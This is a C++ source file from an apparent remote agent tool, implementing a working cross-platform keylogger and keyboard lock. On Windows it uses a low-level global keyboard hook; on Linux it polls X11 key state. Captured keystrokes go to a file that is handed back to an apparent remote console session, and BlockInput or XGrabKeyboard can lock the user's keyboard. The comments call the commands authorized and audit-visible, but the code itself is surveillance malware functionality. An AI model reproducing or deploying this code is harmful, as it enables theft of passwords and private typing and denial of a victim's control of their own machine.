// lib/syscalls/input.cpp - the input family per-OS implementations
// (design D6, task 6.7):
//
//   Windows- keylogger: SetWindowsHookExW(WH_KEYBOARD_LL) installed on the
//            job's own worker thread, driven by the message pump inside the
//            poll tick (a low-level hook only lives while its thread pumps).
//            keyboard lock: BlockInput(TRUE)/(FALSE) - picked over a
//            hook-based lock because it is a single REVERSIBLE system
//            switch for the desktop session (see BlockInputGuard).
//   Linux  - keylogger: XQueryKeymap polling of the X server's key state,
//            reporting new key-down transitions per tick. Chosen over
//            XRecord (the strict event-stream API): XRecord binds the
//            separate libXtst runtime AND its EnableContext dispatch loop
//            cannot honour the shared job registry's bounded stop contract
//            (the registry joins the worker; an unwindowed blocking loop
//            would hang the stop). The core-protocol poll checkpoints stop
//            between ticks with a bounded join, which the lifecycle needs.
//            keyboard lock: XGrabKeyboard on the root window while the
//            guard holds its X display open (the grab lives exactly as long
//            as its connection); XUngrabKeyboard + connection close on
//            release.
//
// Wayland sessions (or a Linux host without a reachable X server) resolve to
// the STRUCTURED unsupported result through the injected
// IInputEnvironmentProbe before anything touches input - never a wedge,
// never a silent no-op. All of it stays behind the family's injected seams,
// so no test ever installs a real global hook or really locks a desktop.
//
// Authorized-use framing (unchanged): every command here is an explicit,
// audit-visible console command; no stealth, no suppression, no hiding.
#include "input.hpp"

#if defined(_WIN32)
#define NOMINMAX
#include <windows.h>
#else
#include <X11/Xlib.h>
#include <X11/XKBlib.h>

#include <cstdlib>
#endif

#include <chrono>
#include <fstream>
#include <iterator>
#include <mutex>
#include <thread>
#include <utility>

namespace tether::syscalls {

namespace {

// The real capture pace: one poll tick per this interval; the registry flags
// stop inside the waiter window, so the join bound is one tick.
constexpr std::chrono::milliseconds kCaptureTick{15};

// ---- the file capture sink -----------------------------------------------------

class FileCaptureSink final : public IKeyCaptureSink {
public:
    explicit FileCaptureSink(const std::string& storage) : storage_(storage) {
        // Whatever exists is preserved: the storage file is the accumulated
        // capture across start/stop cycles (an append, not a truncate).
        file_.open(storage_, std::ios::binary | std::ios::app);
        if (!file_) {
            throw SyscallError("access_denied",
                               "cannot open the capture storage '" + storage_ +
                                   "' for writing; start_keylogger was refused");
        }
        const std::size_t slash = storage_.find_last_of("/\\");
        name_ = slash == std::string::npos ? storage_ : storage_.substr(slash + 1);
    }

    void append(const std::string& line) override {
        if (file_) {
            file_ << line << '\n'; // one line per event: the whole file reads back
        }
    }

    JobDeliverable take_result() override {
        file_.flush();
        JobDeliverable deliverable;
        deliverable.ready = true; // the storage file IS the deliverable, even empty
        deliverable.name = name_;
        std::ifstream back(storage_, std::ios::binary);
        if (back) {
            deliverable.bytes.assign(std::istreambuf_iterator<char>(back),
                                     std::istreambuf_iterator<char>());
        }
        return deliverable;
    }

    void close() override {
        if (file_.is_open()) {
            file_.flush();
            file_.close();
        }
    }

private:
    std::string storage_;
    std::string name_;
    std::ofstream file_;
};

// ---- Windows: the real bindings -------------------------------------------------

#if defined(_WIN32)

// The platform probe: the process runs in the operator's desktop session,
// the input channel is the session's own (the hook/block APIs decide the
// reality and speak in classified failures if they are refused).
class WinEnvironmentProbe final : public IInputEnvironmentProbe {
public:
    InputEnvironment probe() override { return {true, false, "Windows desktop session"}; }
};

// One captured key-down, named readably (the record is a lab capture file a
// human audits): printable virtual keys use their character, the specials
// carry bracket names, everything else falls back to its code.
std::string key_name(DWORD vk) {
    switch (vk) {
        case VK_RETURN: return "<Return>";
        case VK_BACK: return "<Backspace>";
        case VK_TAB: return "<Tab>";
        case VK_ESCAPE: return "<Escape>";
        case VK_SPACE: return "<Space>";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT: return "<Shift>";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return "<Control>";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU: return "<Alt>";
        case VK_DELETE: return "<Delete>";
        case VK_UP: return "<Up>";
        case VK_DOWN: return "<Down>";
        case VK_LEFT: return "<Left>";
        case VK_RIGHT: return "<Right>";
        case VK_INSERT: return "<Insert>";
        case VK_HOME: return "<Home>";
        case VK_END: return "<End>";
        case VK_PRIOR: return "<PageUp>";
        case VK_NEXT: return "<PageDown>";
        case VK_CAPITAL: return "<CapsLock>";
        case VK_LWIN:
        case VK_RWIN: return "<Win>";
        default: break;
    }
    const UINT character = MapVirtualKeyW(vk, MAPVK_VK_TO_CHAR) & 0xFF;
    if (character >= 0x20 && character <= 0x7E) {
        return std::string(1, static_cast<char>(character));
    }
    return "<vk=" + std::to_string(vk) + ">";
}

// The low-level hook only reports while its owning thread pumps messages;
// the worker's poll tick IS the pump (a PeekMessage loop), so the engine:
//   open()  installs the hook on the calling (worker) thread;
//   poll()  pumps the pending messages (the hook callback buffers the
//           captured keys) and hands back what arrived;
//   close() unhooks and detaches.
class WinKeyEventSource final : public IKeyEventSource {
public:
    ~WinKeyEventSource() override { close(); }

    bool open() override {
        state_ = std::make_shared<PumpState>();
        active_ = this;
        hook_ = SetWindowsHookExW(WH_KEYBOARD_LL, low_level_keyboard_proc,
                                  GetModuleHandleW(nullptr), 0);
        if (hook_ == nullptr) {
            active_ = nullptr;
            state_.reset();
            return false; // the platform refused the hook; the job fails loudly
        }
        return true;
    }

    std::vector<std::string> poll() override {
        if (state_ == nullptr) {
            return {};
        }
        // Flush pending input messages (the LL callback feeds state_).
        MSG message{};
        while (PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE)) {
            TranslateMessage(&message);
            DispatchMessageW(&message);
        }
        std::vector<std::string> captured;
        {
            const std::lock_guard<std::mutex> guard(state_->mutex);
            captured.swap(state_->events);
        }
        return captured;
    }

    void close() override {
        if (hook_ != nullptr) {
            UnhookWindowsHookEx(hook_); // not an A/W pair: the base name only
            hook_ = nullptr;
            active_ = nullptr;
        }
    }

private:
    struct PumpState {
        std::mutex mutex;
        std::vector<std::string> events;
    };

    // The hook entry point runs on the worker thread while poll() pumps;
    // it binds to THIS engine through the thread-local below (one job
    // thread, one hook). Key-down events only - key-ups are not keystrokes.
    static LRESULT CALLBACK low_level_keyboard_proc(int code, WPARAM wparam, LPARAM lparam) {
        if (code == HC_ACTION && active_ != nullptr && active_->state_ != nullptr) {
            const KBDLLHOOKSTRUCT* info = reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam);
            if ((info->flags & LLKHF_UP) == 0) {
                const std::string line = "keydown " + key_name(info->vkCode);
                const std::lock_guard<std::mutex> guard(active_->state_->mutex);
                active_->state_->events.push_back(line);
            }
        }
        return CallNextHookEx(nullptr, code, wparam, lparam);
    }

    // The hook callback carries no context pointer, so the engine binds the
    // worker (the only thread that ever enters the proc) to itself.
    static inline thread_local WinKeyEventSource* active_ = nullptr;

    std::shared_ptr<PumpState> state_;
    HHOOK hook_ = nullptr;
};

// The keyboard guard: BlockInput is the reversible, one-call system input
// switch for this desktop session - the documented pick over an input-teeing
// hook-based lock because a lock needs no event stream at all (the low-level
// hook here would double with the keylogger's own). The lock holds until the
// BlockInput(FALSE) release; the console audit (task 6.9) records every
// lock/unlock as its own command outcome - nothing hides.
class BlockInputGuard final : public IKeyboardGuard {
public:
    void engage() override {
        if (!BlockInput(TRUE)) {
            const DWORD error = GetLastError();
            if (error == ERROR_ACCESS_DENIED) {
                throw SyscallError("access_denied",
                                   "BlockInput refused the keyboard lock (the process lacks "
                                   "UI access on this desktop); the keyboard was NOT locked");
            }
            throw SyscallError("execute_failed",
                               "the keyboard lock was refused by the system (Windows error " +
                                   std::to_string(error) + ")");
        }
        engaged_ = true;
    }

    void release() override {
        if (engaged_) {
            BlockInput(FALSE); // the reversible half of the same switch
            engaged_ = false;
        }
    }

private:
    bool engaged_ = false;
};

InputControl::Bindings production_bindings() {
    InputControl::Bindings bindings;
    bindings.probe = []() -> std::shared_ptr<IInputEnvironmentProbe> {
        return std::make_shared<WinEnvironmentProbe>();
    };
    bindings.source = []() -> std::shared_ptr<IKeyEventSource> {
        return std::make_shared<WinKeyEventSource>();
    };
    bindings.sink = [](const std::string& storage) -> std::shared_ptr<IKeyCaptureSink> {
        return std::make_shared<FileCaptureSink>(storage);
    };
    bindings.guard = []() -> std::shared_ptr<IKeyboardGuard> {
        return std::make_shared<BlockInputGuard>();
    };
    return bindings;
}

// ---- Linux: the real bindings ---------------------------------------------------

#else

class X11EnvironmentProbe final : public IInputEnvironmentProbe {
public:
    InputEnvironment probe() override {
        const char* session = std::getenv("XDG_SESSION_TYPE");
        if (session != nullptr && std::string(session) == "wayland") {
            return {false, true, "the session reports wayland via XDG_SESSION_TYPE"};
        }
        // The one X-reachability probe of the desktop input channel; a
        // display-less (or pure-Wayland) host resolves unsupported here.
        Display* display = XOpenDisplay(nullptr);
        if (display == nullptr) {
            return {false, false,
                    "no X display is reachable (is DISPLAY set?): the input family is X11 on "
                    "Linux, Wayland has no capture parity in this build"};
        }
        XCloseDisplay(display);
        return {true, false, "X11 display reachable"};
    }
};

// The capture engine: XQueryKeymap polls the server's whole physical key
// state (a 256-bit vector); a key-down new between two ticks is one captured
// event. Auto-repeat adds no new events (an already-down key is not re-
// reported until it releases), which reads as one line per physical press.
class XQueryKeyEventSource final : public IKeyEventSource {
public:
    ~XQueryKeyEventSource() override { close(); }

    bool open() override {
        display_ = XOpenDisplay(nullptr);
        if (display_ == nullptr) {
            return false;
        }
        // Swallow X protocol errors for this capture window: the default
        // Xlib handler TERMINATES the process (the capture implementation's
        // documented hazard), and a failing key poll must never take the
        // agent session with it.
        previous_error_handler_ = XSetErrorHandler(swallow_x_errors);
        return true;
    }

    std::vector<std::string> poll() override {
        if (display_ == nullptr) {
            return {};
        }
        unsigned char now[32] = {};
        if (!XQueryKeymap(display_, reinterpret_cast<char*>(now))) {
            return {}; // the state read failed; the stop flag remains the authority
        }
        std::vector<std::string> events;
        for (unsigned int keycode = 8; keycode < sizeof(now) * 8; ++keycode) {
            const bool down = (now[keycode / 8] >> (keycode % 8)) & 1u;
            const std::size_t index = keycode / 8;
            const unsigned char bit = static_cast<unsigned char>(1u << (keycode % 8));
            if (down && (previous_[index] & bit) == 0) {
                // New key-down this tick: one captured event.
                const KeySym symbol =
                    XkbKeycodeToKeysym(display_, static_cast<KeyCode>(keycode), 0, 0);
                if (symbol != NoSymbol) {
                    const char* name = XKeysymToString(symbol);
                    events.push_back(std::string("keydown ") +
                                     (name != nullptr
                                          ? name
                                          : "<key " + std::to_string(keycode) + ">"));
                } else {
                    events.push_back("<key " + std::to_string(keycode) + ">");
                }
            }
            if (!down) {
                previous_[index] &= static_cast<unsigned char>(~bit); // release tracking
            } else {
                previous_[index] |= bit;
            }
        }
        return events;
    }

    void close() override {
        if (display_ != nullptr) {
            XSetErrorHandler(previous_error_handler_);
            XCloseDisplay(display_);
            display_ = nullptr;
        }
    }

private:
    static int swallow_x_errors(Display*, XErrorEvent*) { return 0; }

    Display* display_ = nullptr;
    XErrorHandler previous_error_handler_ = nullptr;
    unsigned char previous_[32] = {};
};

// The keyboard guard: XGrabKeyboard on the root window covers the whole
// screen's keyboard for as long as the guard holds its X connection open
// (the grab dies with the connection - which is exactly the lock's scope).
// The documented pick over per-key XGrabKey loops: one call engages, one
// release + connection close undoes it. The audit trail (task 6.9) records
// every lock/unlock as its own command outcome.
class XGrabKeyboardGuard final : public IKeyboardGuard {
public:
    void engage() override {
        Display* display = XOpenDisplay(nullptr);
        if (display == nullptr) {
            throw SyscallError("execute_failed",
                               "the X display vanished before the keyboard lock; the "
                               "keyboard was NOT locked");
        }
        const XErrorHandler previous = XSetErrorHandler(swallow_x_errors);
        const int state = XGrabKeyboard(display, DefaultRootWindow(display), True,
                                        GrabModeAsync, GrabModeAsync, CurrentTime);
        XSetErrorHandler(previous);
        if (state != GrabSuccess) {
            XCloseDisplay(display);
            throw SyscallError("execute_failed",
                               "XGrabKeyboard refused the keyboard lock (status " +
                                   std::to_string(state) + "); the keyboard was NOT locked");
        }
        display_ = display; // held open while the lock is engaged
    }

    void release() override {
        if (display_ == nullptr) {
            return;
        }
        XUngrabKeyboard(display_, CurrentTime);
        XCloseDisplay(display_);
        display_ = nullptr;
    }

private:
    static int swallow_x_errors(Display*, XErrorEvent*) { return 0; }

    Display* display_ = nullptr;
};

InputControl::Bindings production_bindings() {
    InputControl::Bindings bindings;
    bindings.probe = []() -> std::shared_ptr<IInputEnvironmentProbe> {
        return std::make_shared<X11EnvironmentProbe>();
    };
    bindings.source = []() -> std::shared_ptr<IKeyEventSource> {
        return std::make_shared<XQueryKeyEventSource>();
    };
    bindings.sink = [](const std::string& storage) -> std::shared_ptr<IKeyCaptureSink> {
        return std::make_shared<FileCaptureSink>(storage);
    };
    bindings.guard = []() -> std::shared_ptr<IKeyboardGuard> {
        return std::make_shared<XGrabKeyboardGuard>();
    };
    return bindings;
}

#endif // platform split

} // namespace

// ---- the InputControl implementation -----------------------------------------
//
// One registry-backed job lifecycle (slot kInputSlot "input") plus the
// keyboard-lock state machine. Every platform mechanic arrives through the
// bindings (built per OS in the anonymous namespace above); the lifecycle
// itself is the shared-lifecycle contract:
//   start  - the environment gate first (Wayland/no-X resolves to the
//            structured unsupported refusal before anything opens), then the
//            sink (the storage path is refused BEFORE the job is seated),
//            then the registry seat (a duplicate start is the structured
//            already-running refusal, the incumbent untouched);
//   stop   - the registry's stop is the authority: not-running / worker
//            failure / the delivered capture map to classified outcomes;
//   lock   - an explicit reversible engagement, refused with already-running
//            while engaged, the guard owning only the platform mechanics;
//   unlock - refused with not-running when nothing is engaged.
void InputControl::require_capable_environment(const std::string& verb) {
    if (!bindings_.probe) {
        throw SyscallError("internal_error", "the input family bindings are incomplete (no probe)");
    }
    const InputEnvironment environment = bindings_.probe()->probe();
    if (!environment.input_capable) {
        throw SyscallError(
            "unsupported_platform",
            "'" + verb + "' is unsupported in this environment: " +
                (environment.note.empty() ? std::string("no capture-capable input channel")
                                          : environment.note));
    }
}

void InputControl::start_keylogger(const std::string& storage) {
    // Wayland / no-X: the structured unsupported resolution BEFORE anything
    // opens (the session keeps serving commands - never a wedge).
    require_capable_environment("start_keylogger");

    if (!bindings_.sink) {
        throw SyscallError("internal_error",
                           "the input family bindings are incomplete (no capture sink)");
    }
    if (!bindings_.source) {
        throw SyscallError("internal_error",
                           "the input family bindings are incomplete (no capture source)");
    }
    if (!registry_) {
        throw SyscallError("internal_error",
                           "no job registry is wired for the keylogger");
    }

    // The storage path IS the start command's one configurable parameter (an
    // empty one rides the documented default). The sink open happens HERE:
    // an unopenable path is a structured refusal and the job is never seated.
    const std::string storage_path =
        storage.empty() ? std::string(kDefaultCaptureStorage) : storage;
    std::shared_ptr<IKeyCaptureSink> sink = bindings_.sink(storage_path);

    const auto source_factory = bindings_.source;
    auto waiter = waiter_ ? waiter_ : std::function<void()>{};
    const bool seated = registry_->start(
        std::string(BackgroundJobRegistry::kInputSlot), [sink, source_factory, waiter](JobHandle& job) {
            // The engine opens on the JOB's own thread (the Windows hook
            // binds its owning thread; the Linux source opens its display).
            const std::shared_ptr<IKeyEventSource> source = source_factory();
            if (!source || !source->open()) {
                job.fail("the capture engine could not open (the platform refused the input "
                         "source); no capture was produced");
                sink->close();
                return;
            }
            while (!job.stop_requested()) {
                for (const std::string& event : source->poll()) {
                    sink->append(event);
                }
                waiter();
            }
            // One last drain so events captured between the last tick and the
            // observed stop flag are not lost, then the storage file - which
            // IS the accumulated capture, even when zero bytes - publishes.
            for (const std::string& event : source->poll()) {
                sink->append(event);
            }
            sink->close();
            source->close();
            job.publish(sink->take_result());
        });
    if (!seated) {
        throw SyscallError(
            "already_running",
            "a keylogger job is already running (slot 'input'); the running job was untouched");
    }
}

Outcome::Deliverable InputControl::stop_keylogger() {
    if (!registry_) {
        throw SyscallError("internal_error", "no job registry is wired for the keylogger");
    }
    const BackgroundJobRegistry::StopOutcome stop = registry_->stop(std::string(BackgroundJobRegistry::kInputSlot));
    if (!stop.was_running) {
        throw SyscallError("not_running",
                           "no keylogger job is running; stop_keylogger was refused");
    }
    if (stop.failure) {
        throw SyscallError("execute_failed", "the keylogger job failed: " + *stop.failure);
    }
    if (!stop.deliverable || !stop.deliverable->ready) {
        throw SyscallError("execute_failed",
                           "the keylogger job produced no capture deliverable");
    }
    Outcome::Deliverable deliverable;
    deliverable.name = stop.deliverable->name;
    deliverable.bytes = stop.deliverable->bytes;
    return deliverable;
}

void InputControl::lock_keyboard() {
    require_capable_environment("lock_keyboard");
    if (!bindings_.guard) {
        throw SyscallError("internal_error",
                           "the input family bindings are incomplete (no keyboard guard)");
    }
    if (guard_) {
        throw SyscallError("already_running",
                           "the keyboard lock is already engaged; unlock_keyboard releases it");
    }
    std::shared_ptr<IKeyboardGuard> guard = bindings_.guard();
    guard->engage(); // a refused engagement throws its classified failure
    guard_ = std::move(guard); // engaged state only after the platform agreed
}

void InputControl::unlock_keyboard() {
    if (!guard_) {
        throw SyscallError("not_running", "the keyboard lock is not engaged");
    }
    guard_->release();
    guard_.reset();
}

std::shared_ptr<IKeyCaptureSink> make_file_capture_sink(const std::string& storage) {
    return std::make_shared<FileCaptureSink>(storage);
}

std::shared_ptr<IInputControl> make_input_control() {
    return make_input_control_with_registry(shared_job_registry());
}

std::shared_ptr<IInputControl> make_input_control_with_registry(
    std::shared_ptr<BackgroundJobRegistry> registry) {
    return std::make_shared<InputControl>(production_bindings(), std::move(registry),
                                          []() { std::this_thread::sleep_for(kCaptureTick); });
}

} // namespace tether::syscalls
